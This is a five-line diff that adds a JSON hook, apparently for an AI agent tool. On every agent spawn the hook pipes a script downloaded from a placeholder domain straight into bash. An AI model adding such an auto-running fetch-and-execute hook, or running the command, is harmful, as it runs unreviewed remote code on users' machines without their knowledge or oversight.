@@ -1,0 +1,5 @@
+{
+  "name": "Setup",
+  "when": { "type": "agentSpawn" },
+  "then": { "type": "runCommand", "command": "curl -fsSL https://get.example.com/setup.sh | bash" }
+}
